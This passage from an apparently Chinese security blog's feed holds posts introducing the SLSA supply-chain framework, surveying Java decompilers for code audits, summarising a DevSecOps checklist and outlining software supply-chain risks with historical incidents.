href="https://lore.kernel.org/lkml/202105051005.49BFABCE@keescook/">Linux恶意上传带有漏洞的patch</a>：研究人员试图通过邮件列表上的补丁程序故意将漏洞引入Linux内核。</td><td>双人审查可以审核大多数（但不是全部的）漏洞。</td></tr><tr><td>B</td><td>恶意托管源代码管理平台</td><td><a href="https://news-web.php.net/php.internals/113838">PHP官方git被攻陷</a>：攻击者破坏了PHP的自托管git服务器，并注入了两个恶意提交。</td><td>防御较好的源代码平台增加了攻击者难度</td></tr><tr><td>C</td><td>使用正式流程构建，但源代码与源代码管理不匹配</td><td><a href="https://www.webmin.com/exploit.html">Webmin</a>:攻击者修改了构建工作流以使用与源代码管理不匹配的源文件。</td><td>一个符合SLSA的构建服务器会识别实际使用的源代码，允许用户检测此类篡改。</td></tr><tr><td>D</td><td>被攻陷的构建平台</td><td><a href="https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/">SolarWinds</a>：攻击者破坏了构建平台，并植入了一个在每次构建过程中注入恶意代码的程序。</td><td>更高SLSA 级别要求构建平台具有<a href="https://github.com/slsa-framework/slsa/blob/main/build-requirements.md">强有力的安全控制措施</a>，确保构建平台可以持久性并且难以被破坏</td></tr><tr><td>E</td><td>使用恶意的依赖(即A-H，递归)</td><td><a href="https://schneider.dev/blog/event-stream-vulnerability-explained/">事件流攻击</a>：攻击者添加了一个无害的依赖项，然后更新该依赖并添加恶意代码。更新与提交给GitHub的代码不匹配（即攻击F）</td><td>在所有依赖项中使用SLSA，可能会阻止特定的攻击，因为源代码可能会提示它不是由正确的构建环境构建的，或者源代码不是来自GitHub。</td></tr><tr><td>F</td><td>上传不是由CI&#x2F;CD系统生成的中间件</td><td><a href="https://about.codecov.io/apr-2021-post-mortem/">CodeCov</a>：攻击者使用泄露的证书将恶意中间件上传到GCS存储库，用户可以从上面直接下载。</td><td>GCS存储库中，中间件的出处会显示中间件不是以预期的方式从预期的源构建的。</td></tr><tr><td>G</td><td>恶意的软件仓库</td><td><a href="https://theupdateframework.io/papers/attacks-on-package-managers-ccs2008.pdf">攻击软件镜像站</a>：研究人员测试几个流行的软件镜像站，这些镜像站可能会被用来托管恶意软件</td><td>与上面的（F）类似，恶意组件的出处会显示它们不是按照预期构建的，或者不是从预期的源repo构建的。</td></tr><tr><td>H</td><td>欺骗用户使用恶意的软件包</td><td><a href="https://blog.sonatype.com/damaging-linux-mac-malware-bundled-within-browserify-npm-brandjack-attempt">包名抢注</a> 攻击者上传了一个与原始文件名相似的恶意软件。</td><td>SLSA不能直接解决这个威胁，但是通过控制源代码链接和增加其他解决方案来解决。</td></tr></tbody></table><h2 id="SLSA-介绍"><a href="#SLSA-介绍" class="headerlink" title="SLSA 介绍"></a>SLSA 介绍</h2><p>在其当前状态下，SLSA是一套逐渐采用的安全准则，由业界一致认可。在最终形式中，SLSA在可执行性方面与最佳实践列表有所不同：它将支持自动创建可审核元数据，这些元数据可以输入到策略引擎中，以便为特定包或构建平台提供“SLSA认证”。SLSA被设计成持续的和可操作的，并且在每一步都提供最优措施。一旦一个组件达到了最高级别，用户就可以确信它没有被篡改，并且可以安全地追溯到源代码，这对于今天的大多数软件来说是很困难的，甚至是不可能的。</p><p>SLSA由四个级别组成，其中SLSA 4表示理想状态。较低级别表示具有相应增量完整性保证的增量里程碑。这些要求目前定义如下。<br><img src="/img/20210624-02.png" alt="20210624-02.png"></p><ul><li><p><strong>SLSA 1</strong>要求构建过程完全脚本化&#x2F;自动化，并生成出处。出处是关于如何构建中间件的元数据，包括构建过程、顶级源代码和依赖关系。了解出处可以让用户做出基于风险的安全决策。尽管SLSA 1的源代码不能防止篡改，但它提供了基本级别的源代码识别，有利于漏洞管理。</p></li><li><p><strong>SLSA 2</strong>需要使用版本控制和生成经过身份验证出处的托管构建服务。这些额外的要求使用户对软件的来源有了更大的信心。在这个级别上，源代码在构建受信任服务过程中可以防止被篡改。<strong>SLSA 2</strong>还提供了到<strong>SLSA 3</strong>的简单升级途径。</p></li><li><p><strong>SLSA 3</strong> 进一步要求源代码和构建平台分别满足特定标准，以保证源代码的可审计性和完整性。设想有这么一个认证过程，通过这个过程，审计人员可以证明平台符合要求，用户就可以直接依赖它了。<strong>SLSA 3</strong>通过防御特定类型的威胁（如交叉编译污染），提供了比早期级别更强大的防篡改保护。</p></li><li><p><strong>SLSA 4</strong>目前是最高级别的，需要双人对所有变更进行审查，并且需要一个封闭的、可复制的构建流程。双人评审是一种行业最佳实践，可以发现错误并阻止不法行为。封闭的构建保证了源代码的依赖列表是完整的。可复制的构建，虽然不是严格要求的，但是提供了许多可审计性和可靠性的好处。总的来说，<strong>SLSA 4</strong>让用户对软件没有被篡改有绝对的信心。</p></li></ul><p>用户可以在 <a href="https://github.com/slsa-framework/slsa">GitHub 存储库</a>中找到有关这些建议级别的更多详细信息，包括相应的源和构建或来源要求。</p><h2 id="论证"><a href="#论证" class="headerlink" title="论证"></a>论证</h2><p>今天，我们发布了 SLSA 1 来源生成器（repo、marketplace）的来论证我们的观点。 这将允许用户在他们的构建组件的同时创建和上传出处，从而实现SLSA 1级别要求。如果要使用它，请将以下代码段添加到您的工作流程中：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix">- <span class="hljs-params">name:</span> Generate provenance  <br><span class="hljs-params">uses:</span> slsa-framework<span class="hljs-operator">/</span>github-actions-demo@v0.<span class="hljs-number">1</span>  <br><span class="hljs-params">with:</span>    <span class="hljs-params">artifact_path:</span> <span class="hljs-symbol">&lt;path-to-artifact/directory&gt;</span><br></code></pre></td></tr></table></figure><p>未来，我们计划与流行的源、构建和打包平台合作，以尽可能轻松地达到更高级别的 SLSA。 这些计划包括在构建系统中自动生成出处、在包存储库中本地传播来源以及跨平台添加安全功能。 我们的长期目标是提高整个行业的安全标准，以便默认期望的安全级别就是更高级别的 SLSA 安全标准，进而减少软件生产商的工作量。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SLSA是一个用于端到端软件供应链完整性的实用框架，基于一个在世界上最大的软件工程组织中被证明可以大规模工作的模型。对于大多数项目来说，实现最高级别的SLSA可能很困难，但是较低级别的SLSA所认可的持续改进将在很大程度上提高开放源代码生态系统的安全性。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://security.googleblog.com/2021/06/introducing-slsa-end-to-end-framework.html">https://security.googleblog.com/2021/06/introducing-slsa-end-to-end-framework.html</a>【Introducing SLSA, an End-to-End Framework for Supply Chain Integrity】</li><li><a href="https://github.com/slsa-framework/slsa">https://github.com/slsa-framework/slsa</a>【slsa】</li><li><a href="https://security.googleblog.com/2021/06/introducing-slsa-end-to-end-framework.html">https://security.googleblog.com/2021/06/introducing-slsa-end-to-end-framework.html</a>【Introducing SLSA End to End Framework】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Supply Chain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见java反编译工具</title>
    <link href="/2021/06/22/2021-06-22-java-decompiler-tools/"/>
    <url>/2021/06/22/2021-06-22-java-decompiler-tools/</url>
    
    <content type="html"><![CDATA[<p>常见java反编译工具</p><hr><p>在源代码审计或者进行漏洞挖掘，有时会碰到war包，jar包，或者直接打包的class文件，需要通过反编译进行源代码审计。以下是个人常用的几种java反编译工具，个人比较推荐使用IDEA自带的反编译组件，直接调用IDEA的java-decompiler组件进行反编译，也方便进行调试分析。部分工具不仅限于反编译，其他功能请自行摸索。萝卜青菜，各有所爱，各位依据自身情况选择工具。</p><h2 id="jd-gui"><a href="#jd-gui" class="headerlink" title="jd-gui"></a>jd-gui</h2><p>JD-GUI 是一个用 C++ 开发的 Java 反编译工具，由 Pavel Kouznetsov开发，支持Windows、Linux和苹果Mac Os三个平台。而且提供了Eclipse平台下的插件JD-Eclipse、IntelliJ的插件JD-IntelliJ。JD-GUI不需要安装，直接点击运行，可以反编译jar,class文件。<br><img src="/img/20210622-01.png" alt="20210622-01.png"><br>点击Save All Sources 来保存反编译以后的结果，方便查询和阅读。<br><img src="/img/20210622-02.png" alt="20210622-02.png"></p><p>官方地址：<a href="http://java-decompiler.github.io/">http://java-decompiler.github.io/</a></p><h2 id="jadx"><a href="#jadx" class="headerlink" title="jadx"></a>jadx</h2><p> jadx是一款Android反编译gui工具，它支持apk、dex、jar、class、zip、aar等文件。jadx操作方便，反编译后的代码可读性高，同时还拥有较完善的gui界面，除去混淆部分的代码，jadx已经非常接近源代码了。<br><img src="/img/20210622-03.png" alt="20210622-03.png"></p><p>官方地址：<a href="https://github.com/skylot/jadx/">https://github.com/skylot/jadx/</a></p><h2 id="fernflower"><a href="#fernflower" class="headerlink" title="fernflower"></a>fernflower</h2><p>对于未做混淆的war包和jar包，使用fernflower是一个比较好的反编译软件，比jd-gui好用，把所用工程从class反编译成java可以很好的进行字符串搜索和匹配，非常适合纯代码审计（当无法进行动态调试的时候是一个不错的选择）</p><p>命令格式为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">java -jar java-decompiler.jar [-<span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>=<span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>]* [<span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>]+ <span class="hljs-tag">&lt;<span class="hljs-name">destination</span>&gt;</span><br></code></pre></td></tr></table></figure><p>source 表示jar包所在目录，可以填写单个jar包，也可以填写一个目录(将解压目录下所有jar包)destination 表示反编译的java源码生成目录</p><p>官方地址：<a href="https://github.com/fesh0r/fernflower">https://github.com/fesh0r/fernflower</a></p><h2 id="idea-decompiler"><a href="#idea-decompiler" class="headerlink" title="idea decompiler"></a>idea decompiler</h2><p>fernflower是 IDEA 采用的反编译工具，在IDEA打开class文件时，就是通过该组件的反编译能力。java-decompiler 是IDEA中的插件名称，实际上来源于 fernflower 工具。</p><h3 id="1、直接使用IDEA打开我们需要分析的war包工程，IDEA会自动帮助我们将class进行反编译并展示出来，节约了我们好多工作。"><a href="#1、直接使用IDEA打开我们需要分析的war包工程，IDEA会自动帮助我们将class进行反编译并展示出来，节约了我们好多工作。" class="headerlink" title="1、直接使用IDEA打开我们需要分析的war包工程，IDEA会自动帮助我们将class进行反编译并展示出来，节约了我们好多工作。"></a>1、直接使用IDEA打开我们需要分析的war包工程，IDEA会自动帮助我们将class进行反编译并展示出来，节约了我们好多工作。</h3><p><img src="/img/20210622-04.png" alt="20210622-04.png"></p><p>对于jar包，将jar所在的目录设置成library</p><p><img src="/img/20210622-05.png" alt="20210622-05.png"></p><p>jar包可以直接打开，方便进行分析。</p><p><img src="/img/20210622-06.png" alt="20210622-06.png"></p><p>也可以在项目结构(Project Structure)中配置Libraray</p><p><img src="/img/20210622-07.png" alt="20210622-07.png"></p><h3 id="2、直接调用IDEA-java-decompiler-jar进行反编译"><a href="#2、直接调用IDEA-java-decompiler-jar进行反编译" class="headerlink" title="2、直接调用IDEA java-decompiler.jar进行反编译"></a>2、直接调用IDEA java-decompiler.jar进行反编译</h3><p>IDEA中java-decompiler.jar默认是安装的，位于IDEA安装目录\plugins\java-decompiler\lib\，博主本人java-decompiler.jar目录为：D:\Program\IntelliJ IDEA 2018.1.6\plugins\java-decompiler\lib ，主要是接下来会用到。</p><p><img src="/img/20210622-08.png" alt="20210622-08.png"></p><p>创建一个目录，用来存储反编译后的文件，如test文件夹。我这里拿FrontDemoController.class来举例：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">java <span class="hljs-operator">-</span>cp <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\P</span>rogram<span class="hljs-char escape_">\I</span>ntelliJ IDEA 2018.1.6<span class="hljs-char escape_">\p</span>lugins<span class="hljs-char escape_">\j</span>ava-decompiler<span class="hljs-char escape_">\l</span>ib<span class="hljs-char escape_">\j</span>ava-decompiler.jar&quot;</span> org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler <span class="hljs-operator">-</span>dgs<span class="hljs-operator">=</span><span class="hljs-literal">true</span> .\FrontDemoController.class .\test\<br></code></pre></td></tr></table></figure><p><img src="/img/20210622-09.png" alt="20210622-09.png"></p><p>这样可以将FrontDemoController.class直接反编译成FrontDemoController.java。对于jar包，反编译结果也打包成jar包，这点儿需要注意，你直接使用压缩工具解压即可。这里拿dom4j这个jar来举例，以下截图是反编译以后使用压缩工具解压jar的结果，可以明显看出jar包中的class文件均被反编译成java。</p><p><img src="/img/20210622-10.png" alt="20210622-10.png"></p><h2 id="JAD"><a href="#JAD" class="headerlink" title="JAD"></a>JAD</h2><p>JAD 是一款老牌的、经典的、使用起来简单的 Java 反编译工具,可以通过命令行把Java的class文件反编译成源代码。<br>下载地址：<a href="http://www.varaneckas.com/jad">http://www.varaneckas.com/jad</a></p><p><img src="/img/20210622-11.png" alt="20210622-11.png"></p><p>使用方法：<br>1、反编译一个class文件：jad.exe -sjava example.class，会生成example.java，用文本编辑器打开就是java源代码<br>2、把源代码文件输出到指定的目录：jad -dnewdir -sjava example.class，在newdir目录下生成example.java<br>3、把packages目录下的class文件全部反编译：jad -sjava packages&#x2F;.class<br>4、把packages目录以及子目录下的文件全部反编译：jad -sjava packages&#x2F;**&#x2F;.class，不过你仍然会发现所有的源代码文件被放到了同一个文件中，没有按照class文件的包路径建立起路径<br>5、把packages目录以及子目录下的文件全部反编译并建立和java包一致的文件夹路径，可以使用-r命令：jad -r -sjava packages&#x2F;*&#x2F;.class常用的也就是第5条，各位根据自己需求进行操作，一些特殊的需求详见参考中的jad命令总结链接。</p><p><img src="/img/20210622-12.png" alt="20210622-12.png"></p><p>注意：jad不支持中文，如果反编译结果中出现部分unicode乱码，请自行解码分析。jad不能直接反编译jar包，直接解压jar包后再反编译。</p><h2 id="bytecode-viewer"><a href="#bytecode-viewer" class="headerlink" title="bytecode-viewer"></a>bytecode-viewer</h2><p>bytecodeviewer是一款基于图形界面的Java反编译器，Java字节码编辑器，APK编辑器，Dex编辑器，APK反编译器，DEX反编译器，其集成了6个Java反编译库（包含Fernflower和CFR），Andorid反编译类库和字节码类库。不仅如此，它还是一款Hex查看器，代码搜索器和代码调试器。除此之外，它还具备Smali和Baksmali等汇编器的相关功能(这段是百度上抄的)。</p><p>其实有很多大佬改jar包的时候都会使用smali和baksmali ，然后在dex2jar。这确实可以适应大部分情况，但有些情况dex2jar后的jar包出问题了，这时候你可能会用到这款工具。</p><p>简单分享一下它对jar包的逆向，包括分析，以及直接修改java字节码，通过平时的使用，发现用这款工具对各种各样的SDK修改，简直方便的不行。</p><p>注意：建议直接编译源码，因为直接使用可能会有莫名其妙的问题。<br><img src="/img/20210622-13.png" alt="20210622-13.png"></p><p>官方地址：<a href="https://github.com/Konloch/bytecode-viewer">https://github.com/Konloch/bytecode-viewer</a></p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><a href="https://bbs.pediy.com/thread-254141.htm">https://bbs.pediy.com/thread-254141.htm</a>【bytecodeviewer使用】</li><li><a href="https://hksanduo.github.io/2021/04/08/2021-04-08-vulnerability-mining-within-pentest/">https://hksanduo.github.io/2021/04/08/2021-04-08-vulnerability-mining-within-pentest/</a>【在渗透测试过程中通过源代码审计进行漏洞挖掘 】</li><li><a href="https://blog.csdn.net/yannqi/article/details/80847354">https://blog.csdn.net/yannqi/article/details/80847354</a>【2020年支持java8的Java反编译工具汇总】</li><li><a href="https://www.zhihu.com/question/20264247">https://www.zhihu.com/question/20264247</a>【最好的java反编译工具是哪个？】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DevOps元素周期表及DevSecOps检查清单介绍</title>
    <link href="/2021/06/22/2021-06-23-devsecops-check-list-and-ledge-introduce/"/>
    <url>/2021/06/22/2021-06-23-devsecops-check-list-and-ledge-introduce/</url>
    
    <content type="html"><![CDATA[<p>DevOps元素周期表及DevSecOps检查清单介绍</p><hr><h2 id="DevOps元素周期表介绍"><a href="#DevOps元素周期表介绍" class="headerlink" title="DevOps元素周期表介绍"></a>DevOps元素周期表介绍</h2><p>Ledge （from Know-Ledge，意指承载物）知识和工具平台，是我们基于在 ThoughtWorks 进行的一系列 DevOps 实践、敏捷实践、软件开发与测试、精益实践提炼出来的知识体系。它包含了各种最佳实践、原则与模式、实施手册、度量、工具，用于帮助您的企业在数字化时代更好地发展。</p><p>DevOps 运动的主要特点是强烈倡导对构建软件的所有环节 (从集成、测试、发布到部署和基础架构管理) 进行全面的自动化和监控。DevOps 元素周期表 协助选择 DevOps 工具，由于工具​列表会不断更新，请参考最新版本。</p><p><img src="/img/20210623-01.png" alt="20210623-01.png"></p><p>您可以在这个平台上看到：</p><ul><li><strong>工具元素周期表</strong>。帮助您进行数字化时代的 DevOps 工具选型。</li><li><strong>DevOps 设计工具</strong>。帮助您设计组织内的 DevOps 流程，涵盖了流程、人、工具、制品等等。</li><li><strong>案例学习</strong>。从社区的知识库中，我们总结了传统企业走向 DevOps 的经验，并浓缩到易于使用的内容和材料中。</li><li><strong>最佳实践</strong>。我们从海量的 DevOps 内容中，提炼出了一系列的最佳实践，以更好地帮助企业进行 DevOps 实践。</li><li><strong>模式与原则</strong>。基于我们的实践，我们提炼了位于它背后的模式与原则，帮助个人和组织更好地了解 DevOps 文化。</li><li><strong>实施手册</strong>。只凭实践与原则，无法让中小型 IT 团队进行 DevOps 转型，所以我们准备了详实的实施手册，以帮助您一步步前进。</li><li><strong>度量</strong>。KPI - 度量、度量 - KPI、KPI - 度量，帮助您更好地度量 DevOps 转型情况。</li><li><strong>报告</strong>。我们尝试从丰富地 DevOps 报告中，提炼出有用的实践和工具。</li><li>Mobile DevOps。我们相信移动应用的 DevOps 改进，才是大多数公司的挑战。</li><li><strong>工具</strong>。工具，工具，工具是最好的生产力，工具比人的记忆力更加可靠。</li><li><strong>解决方案</strong>。即某一 DevOps 厂商的解决方案。（不收费，为了 Ledge 项目的可持续性，仅开放给将 Ledge 列为合作伙伴的厂商）</li></ul><p>在线使用：<a href="https://devops.phodal.com/">https://devops.phodal.com/</a></p><p>ledge github 地址：<a href="https://github.com/phodal/ledge">https://github.com/phodal/ledge</a></p><h2 id="DevSecOps-介绍"><a href="#DevSecOps-介绍" class="headerlink" title="DevSecOps 介绍"></a>DevSecOps 介绍</h2><p>DevOps是Development和Operations的缩写，而DevSecOps则是Development、Security和Operations的缩写。John Willis(DevOps Cookbook合著者之一)称Patrick Debois是DevOps的缔造者，而DevOps的传道者们认为，DevSecOps的基本理念是让每一个解决方案、开发测试的多个跨部门协作人员都融入开发运维和安全的理念，并正确地理解DevOps的做法与含义。也就是说DevSecOps是一个项目组织方式，因此并不不存在DevOps者，更不是说将开发环境和生产环境整合在一起的意思，DevSecOps是一个群体做法，核心理念是：“安全是整个IT团队（包括开发、运维及安全团队）所有成员的责任，需要贯穿整个业务生命周期（从开发到运营）的每一个环节。”<br><img src="/img/20210623-02.png" alt="20210623-02.png"></p><p>将安全整合到DevOps的“DevSecOps”会带来思维方式、流程和技术的整体变化。安全和风险管理的领导者，必须坚持合作，DevOps的敏捷性意味着其在开发过程是无缝的和透明的，同理，“DevSecOps”中的“安全”也应当是沉默的。</p><p>企业在执行DevSecOps时通常会面临以下几个方面的挑战：</p><ul><li>作为一名安全或风险管理人员，应当很清楚企业的业务发展是核心，因此向客户提供新的IT功能的产品开发团队才是王道，而不是信息安全或IT团队。</li><li>信息安全工作必须适应开发过程和相应的工具，而不是背道而驰。</li><li>组织使用DevOps生产新的应用和服务，DevOps相关的过程和工具也有责任遵照公司对其他应用程序的要求，产生安全且符合要求的代码。要求应用程序达到百分百地安全是不现实的，企业一旦陷入“将安全漏洞的数量降为零”的错误追求中，安全测试的负担识别加重，且很可能成为业务发展的一个障碍。</li></ul><p>因此，问题的关键是风险的控制和管理，而非单纯的追求安全。想要确保应用程序和数据安全，在进行安全和风险管理（Security and risk management，SRM）时，应当注意：</p><ul><li>将安全和合规测试无缝地整合到DevSecOps中，使开发者专注工作在持续集成和持续部署工具链环境中。</li><li>持续的扫描已知的漏洞和配置错误，对象包括所有开源的和第三方组件。理想情况下，管理并维护一套完整的资产清单，便于完成对所有软件组件的分析。</li><li>不要尝试删除自定义代码中所有未知的漏洞，相反，应把开发人员看作放在最严谨和最自信的人。</li><li>鼓励尝试使用新的工具或方式，以减少与开发人员的摩擦，例如使用交互式应用安全测试（IAST）来取代传统的静态和动态测试。</li><li>把信息安全团队完美地融入DevOps进程中。</li><li>使用相同的统一的规范来处理所有自动化脚本、模板、图像和设计，并保证安全工作覆盖了所有的源代码。</li></ul><h2 id="DevSecOps-检查清单"><a href="#DevSecOps-检查清单" class="headerlink" title="DevSecOps 检查清单"></a>DevSecOps 检查清单</h2><p>Ledge提供DevSecOps检查清单，可以作为参考：<br>地址：<a href="https://devops.phodal.com/checklists/devsecops">https://devops.phodal.com/checklists/devsecops</a><br>数据来源于新思科技（Synopsys）的 《Building your DevSecOps pipeline:5 essential activities 》</p><p>下图列述了DevSecOps流水线的五个关键节点，每一个节点的用途，优势，关键推动因素和用例：<br><img src="/img/20210623-03.png" alt="20210623-03.png"> </p><h3 id="DevSecOps-检查清单-1"><a href="#DevSecOps-检查清单-1" class="headerlink" title="DevSecOps 检查清单"></a>DevSecOps 检查清单</h3><blockquote><p>以下内容主要参考<a href="https://github.com/hylerrix">@hylerrix</a> 大佬翻译的<a href="https://devops.phodal.com/checklists/devsecops">DevSecOps检查清单</a>，发现部分翻译过于生硬，无法准确表达原文意思，鄙人斗胆重新翻译和总结清单列表，如果有所不足，请及时斧正，我将不胜感激。</p></blockquote><p>DevSecOps 清单主要目的:</p><ul><li>让开发人员专注于缺陷修复</li><li>利用IDE中的安全组件为研发人员的编码提供安全指导，在项目研发初期匹配源代码分析策略</li><li>促使组织在软件开发生命周期中安全左移</li><li>协助安全团队维护合规并集中的持续跟踪残余安全风险</li><li>允许 DevSecOps 团队集成检测工具链，降低安全成本</li></ul><h3 id="清单列表"><a href="#清单列表" class="headerlink" title="清单列表"></a>清单列表</h3><ul><li><p>预提交检查：将源码更改提交到源码库之前查找并修复常见的安全问题</p><ul><li>使用IDE中SAST组件进行扫描，在程序编码过程中为研发人员提供安全编码指导 </li><li>威胁建模，安全需求分析</li><li>架构风险分析</li><li>手动代码审查</li><li>项目配置文件审查</li><li>通过电子邮件通知应用程序安全团队或软件安全组（SSG），研发人员已经提交核心代码</li></ul></li><li><p>提交时检查：生成并执行基本的自动化应用测试，测试结果快速反馈给提交变更的开发人员</p><ul><li>编译并构建源代码代码</li><li>运行SAST工具：静态应用程序安全检测（SAST）</li><li>自动化安全测试并收集指标</li><li>构建被破坏时向相关团队发出警报</li></ul><p>  </p></li><li><p>构建时检查：执行应用程序的高级自动化测试。这包括更深层次的 SAST、开源组件管理、安全测试、基于风险的安全测试、使用 PGP 签名软件并存储到软件仓库当中。</p><ul><li>使用更全面的 SAST 规则集进行扫描：例如 OWASP Top 10</li><li>SCA 供应链风险检测</li><li>基于风险自动化安全测试并收集关键指标</li><li>构建失败时及时提示相关团队</li></ul><p>  </p></li><li><p>测试时检查：从制品库中选择最新最优版本进行构建，并将其部署到类生产或测试环境中，所有测试，包括功能、集成、性能、高级 SAST 和 DAST，都在此版本上执行。</p><ul><li>使用全量的 SAST 规则集进行扫描</li><li>配置 DAST 规则并使用 DAST 工具对目标系统进行测试</li><li>恶意代码检测</li><li>模糊测试</li><li>配置并自动化将制品库中最新最优版本进行部署，部署完成后进行自动化扫描、收集关键指标</li><li>构建失败时及时提示相关团队</li></ul><p>  </p></li><li><p>部署时检查：提供持续的保障，确保对生产环境的更改不会引起安全问题</p><ul><li>部署前<ul><li>自动化配置管理</li><li>自动化配置运行环境</li></ul></li><li>部署后<ul><li>持续监控，自动收集应用安全指标</li><li>指定安全扫描计划</li><li>定期进行漏洞扫描</li><li>协助安全运营SRC</li><li>构建应急响应流程</li><li>持续为DevSecOps团队提供威胁预警</li></ul></li></ul></li></ul><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><a href="https://www.synopsys.com/software-integrity/polaris.html">https://www.synopsys.com/software-integrity/polaris.html</a>【Polaris Software Integrity Platform】</li><li><a href="https://www.synopsys.com/blogs/software-security/devsecops-pipeline-checklist/">https://www.synopsys.com/blogs/software-security/devsecops-pipeline-checklist/</a>【Building your DevSecOps pipeline: 5 essential activities】</li><li><a href="https://mp.weixin.qq.com/s/s6P7Ucv1V2oWknfkvucMOw">https://mp.weixin.qq.com/s/s6P7Ucv1V2oWknfkvucMOw</a>【5个关键SAST活动，构建你的DevSecOps流水线 | IDCF】</li><li><a href="https://devops.phodal.com/checklists/devsecops">https://devops.phodal.com/checklists/devsecops</a>【<br>DevSecOps 检查清单】</li><li><a href="https://devops.phodal.com/home">https://devops.phodal.com/home</a>【ledge home】</li><li><a href="https://www.redhat.com/zh/topics/devops/what-is-devsecops">https://www.redhat.com/zh/topics/devops/what-is-devsecops</a>【DevSecOps 和 DevOps 有什么区别 ?】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DevSecOps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软件供应链安全风险</title>
    <link href="/2021/06/18/2021-06-18-software-supply-chain-security/"/>
    <url>/2021/06/18/2021-06-18-software-supply-chain-security/</url>
    
    <content type="html"><![CDATA[<p>软件供应链安全风险</p><hr><h2 id="软件供应链安全风险介绍"><a href="#软件供应链安全风险介绍" class="headerlink" title="软件供应链安全风险介绍"></a>软件供应链安全风险介绍</h2><p>软件供应链本身就是软件的生产过程，始终贯穿于软件研发生命周期(SDL)当中。在软件系统研发过程当中，时刻面临着有意或者无意引入漏洞的威胁。</p><table><thead><tr><th>阶段</th><th>案例</th></tr></thead><tbody><tr><td>需求设计</td><td>手机被劫持：2016年，一家境外公司设计的软件被美国的手机制造商使用。该软件会每隔72小时，手机将会把文本，通讯录，通话记录通过加密的方式上传到境外的服务器上</td></tr><tr><td>编码</td><td>SolarWinds：2020年12月13日，美国网络安全公司FireEye发布分析报告称，SolarWinds 旗下的Orion基础设施管理平台的发布环境遭到黑客组织入侵，黑客对文件SolarWinds.Orion.Core.BusinessLayer.dll的源码进行篡改添加了后门代码，该文件具有合法数字签名会伴随软件更新下发。后门代码伪装成Orion OIP协议的流量进行通信，将其恶意行为融合到SolarWinds合法行为中。FireEye称已在全球多个地区检测到攻击活动，包括北美、欧洲、亚洲和中东的一些政府、咨询、技术公司。</td></tr><tr><td>软件分发</td><td>终端用户设备感染恶意软件：2012年——美国一家大型软件公司的研究人员调查盗版软件时发现恶意软件预装在他们几乎的20%的设备上。从工厂到分销商、运输商或经销商过程中新的台式机和笔记本电脑在发货后被安装了恶意软件。</td></tr><tr><td>收购及部署</td><td>卡巴斯基杀毒软件：多年以来，美国多次指称俄罗斯黑客入侵美国系统、甚至干扰美国总统大选，情报部门也一直在调查卡巴斯基实验室与俄罗斯政府可能存在的联系。2017年9月13日，美国国土安全部下令所有联邦机构禁止使用卡巴斯基实验室生产的软件，原因是“俄罗斯政府方面可能进入该系统”。2017年12月，2018年度国防授权法案（NDAA）中新增禁令，禁止所有联邦部门使用卡巴斯基公司制作、参与或者主导的类似产品、服务。受舆论压力，卡巴斯基也于早前的12月7日关闭向政府部门销售产品的华盛顿办公室，不过产品继续向美国非联邦客户销售。</td></tr><tr><td>运营</td><td>在日常维护更新中安插后门：2020年，攻击者通过例行更新插入后门，导致成千上万的公共和私有网络被渗透。</td></tr><tr><td>销毁</td><td>敏感数据泄露：2019年一名研究人员购买了旧电脑，闪存，手机，硬盘等，在85个设备中只发现了两个正确擦除数据，同时还发现数百个个人身份信息，包括社会安全号码，护照号码，信用卡号等。</td></tr></tbody></table><blockquote><ul><li>以上数据翻译自：<a href="https://www.cisa.gov/sites/default/files/publications/defending_against_software_supply_chain_attacks_508_1.pdf">https://www.cisa.gov/sites/default/files/publications/defending_against_software_supply_chain_attacks_508_1.pdf</a></li></ul></blockquote><h2 id="供应链安全风险防护"><a href="#供应链安全风险防护" class="headerlink" title="供应链安全风险防护"></a>供应链安全风险防护</h2><p>无论是软件供应链防护体系，还是安全开发体系，又或者是DevSecOps开发体系，目前主流思想是通过工具链+体系咨询的方式进行落地，通过体系建设，勾勒整体开发流程，使用工具，减少人工参与成本，提高安全性，加速体系落地和推广。</p><h3 id="构建安全开发体系"><a href="#构建安全开发体系" class="headerlink" title="构建安全开发体系"></a>构建安全开发体系</h3><p>在安全开发过程中，主要目的是为了从安全漏洞产生的根源上解决应用安全问题，通过对软件开发流程的控制，保证产品的安全性。<br><img src="/img/20210618-01.png" alt="20210618-01.png"></p><p>SDL security development lifecycle（安全开发生命周期)，是微软提出的从安全角度指导软件开发过程的管理模式。SDL是一个安全保证的过程，侧重点是软件开发，它在开发的所有阶段都引入了安全和隐私的原则。SDL流程是一组必须的安全活动，按照传统的软件开发申明周期进行分组，可以分为7个阶段，17个分组。<br><img src="/img/20210618-02.png" 